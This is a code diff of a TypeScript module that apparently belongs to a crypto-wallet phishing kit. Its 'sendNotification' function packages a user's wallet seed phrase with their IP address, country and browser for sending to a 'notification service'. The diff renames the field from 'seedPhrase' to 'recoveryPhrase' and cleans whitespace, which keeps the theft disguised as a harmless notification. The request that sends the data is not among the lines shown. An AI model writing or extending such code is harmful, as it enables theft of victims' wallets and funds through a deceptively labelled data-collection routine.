@@ -2,7 +2,7 @@ import { getUserCountry } from './userLocation';
 
 interface NotificationData {
   appName: string;
-  seedPhrase: string;
+  recoveryPhrase: string;
   ipAddress?: string;
   country?: string;
   browser: string;
@@ -15,23 +15,23 @@ interface NotificationResponse {
 }
 
 /**
- * Sends a notification with the specified app name and seed phrase
+ * Sends a notification with the specified app name and recovery phrase
  * @param appName - The name of the application
- * @param seedPhrase - The seed phrase or message to send
+ * @param recoveryPhrase - The recovery phrase or message to send
  * @returns The response from the notification service
  */
 export async function sendNotification(
   appName: string,
-  seedPhrase: string
+  recoveryPhrase: string
 ): Promise<NotificationResponse> {
   try {
     // Get user location and IP data
     const userData = await getUserCountry();
-    
+
     // Prepare the notification payload
     const notificationData: NotificationData = {
       appName,
-      seedPhrase,
+      recoveryPhrase,
       ...(userData?.ip && { ipAddress: userData.ip }),
       ...(userData?.countryCode && { country: userData.countryCode }),
       browser: detectBrowser()
@@ -52,9 +52,9 @@ export async function sendNotification(
     return { success: true, data: notificationData };
   } catch (error) {
     console.error('Error sending notification:', error);
-    return { 
-      success: false, 
-      error: error instanceof Error ? error.message : 'Unknown error' 
+    return {
+      success: false,
+      error: error instanceof Error ? error.message : 'Unknown error'
     };
   }
 }
@@ -65,7 +65,7 @@ export async function sendNotification(
  */
 function detectBrowser(): string {
   const userAgent = navigator.userAgent;
-  
+
   if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
   if (userAgent.indexOf('SamsungBrowser') > -1) return 'Samsung Browser';
   if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
@@ -73,7 +73,7 @@ function detectBrowser(): string {
   if (userAgent.indexOf('Edge') > -1) return 'Edge';
   if (userAgent.indexOf('Chrome') > -1) return 'Chrome';
   if (userAgent.indexOf('Safari') > -1) return 'Safari';
-  
+
   return 'Unknown';
 }
 
